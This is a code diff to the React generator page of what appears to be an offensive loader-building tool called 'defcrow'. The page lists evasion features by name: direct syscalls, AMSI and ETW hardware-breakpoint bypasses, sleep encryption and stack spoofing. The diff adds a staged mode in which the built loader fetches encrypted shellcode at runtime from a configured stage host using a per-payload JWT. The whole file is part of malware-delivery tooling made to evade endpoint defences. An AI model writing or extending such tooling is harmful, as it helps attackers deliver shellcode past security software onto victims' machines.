@@ -1,6 +1,6 @@
 import { useState, useRef, useEffect } from 'react'
 import { useNavigate }    from 'react-router-dom'
-import { Feature, Encryption, LoaderType, GenerateRequest, AppDomainReq, generate } from '../api/generate'
+import { Feature, Encryption, LoaderType, GenerateRequest, AppDomainReq, StagedReq, generate } from '../api/generate'
 import { StagePayload, listStages, uploadStage, deleteStage, rotateToken } from '../api/stage'
 import { useJobSocket }   from '../hooks/useJobSocket'
 import Header, { StepId } from '../components/Header'
@@ -22,6 +22,7 @@ export default function GeneratorPage() {
   const [features, setFeatures]     = useState<Feature[]>(['DirectSyscall', 'AmsiHwbp', 'EtwHwbp', 'SleepEncrypt', 'StackSpoof'])
   const [encryption, setEncryption] = useState<Encryption>('Aes256')
   const [loaderType, setLoaderType] = useState<LoaderType>('Binary')
+  const [selectedStagePid, setSelectedStagePid] = useState<string | null>(null)
 
   const [jobId, setJobId]           = useState<string | null>(null)
   const [logs, setLogs]             = useState<LogLine[]>([])
@@ -71,6 +72,8 @@ export default function GeneratorPage() {
       const res = await uploadStage(file)
       setStages(prev => [...prev, { pid: res.pid, name: res.name, size: res.size, arch: 'x64', created_at: '' }])
       setTokens(prev => ({ ...prev, [res.pid]: res.jwt }))
+      // Auto-select newly-uploaded stage so canForge becomes true immediately
+      setSelectedStagePid(res.pid)
     } catch { /* ignore */ }
   }
 
@@ -92,17 +95,37 @@ export default function GeneratorPage() {
     setArtifactId(null)
     setConfigXml(null)
     try {
+      // In staged mode, resolve the selected (or first) PID and its JWT,
+      // and pass them with the configured stage host to the backend. The
+      // generated loader will fetch the encrypted shellcode at runtime.
+      let stagedReq: StagedReq | undefined
+      if (mode === 'staged') {
+        const pid = selectedStagePid ?? stages[0]?.pid
+        const jwt = pid ? tokens[pid] : undefined
+        if (!pid || !jwt) {
+          setBuildStatus('error')
+          setLogs(prev => [...prev, { ts: new Date().toISOString().slice(11, 19), tag: 'err', msg: 'No staged payload selected (upload + select first)' }])
+          return
+        }
+        stagedReq = {
+          pid,
+          jwt,
+          host: stageHost,
+          scheme: stageHost.includes('localhost') || stageHost.startsWith('127.') ? 'http' : 'https',
+        }
+      }
       const req: GenerateRequest = {
         loader_type: loaderType,
-        features,
+        features: mode === 'staged' && !features.includes('Staged') ? [...features, 'Staged'] : features,
         encryption,
-        shellcode_hex: shellcodeHex.replace(/\s+/g, ''),
+        shellcode_hex: mode === 'staged' ? '' : shellcodeHex.replace(/\s+/g, ''),
         key_hex: '',
         iv_hex: '',
         appdomain_config: loaderType === 'AppDomain' ? {
           clr_version: appDomainConfig.clr_version || undefined,
           net_version: appDomainConfig.net_version || undefined,
         } : undefined,
+        staged: stagedReq,
       }
       const { job_id } = await generate(req)
       setJobId(job_id)
@@ -112,8 +135,11 @@ export default function GeneratorPage() {
     }
   }
 
-  const smugHost = localStorage.getItem('defcrow_smug_host') ?? 'localhost:8080'
-  const canForge = mode === 'stageless' ? shellcodeHex.length > 0 : stages.length > 0
+  const stageHost = localStorage.getItem('defcrow_stage_host') ?? 'localhost:8080'
+  const smugHost  = localStorage.getItem('defcrow_smug_host')  ?? 'localhost:8080'
+  const canForge  = mode === 'stageless'
+    ? shellcodeHex.length > 0
+    : stages.length > 0 && (selectedStagePid ? !!tokens[selectedStagePid] : !!tokens[stages[0]?.pid ?? ''])
   const showStageTransfer = mode === 'staged'
 
   return (
@@ -133,7 +159,14 @@ export default function GeneratorPage() {
 
           {showStageTransfer && (
             <div ref={el => { sectionRefs.current[2] = el }}>
-              <StageTransferSection stages={stages} tokens={tokens} stageHost="localhost:8080" onRotate={handleRotate} />
+              <StageTransferSection
+                stages={stages}
+                tokens={tokens}
+                stageHost={stageHost}
+                onRotate={handleRotate}
+                selectedPid={selectedStagePid ?? stages[0]?.pid ?? null}
+                onSelect={setSelectedStagePid}
+              />
             </div>
           )}
 
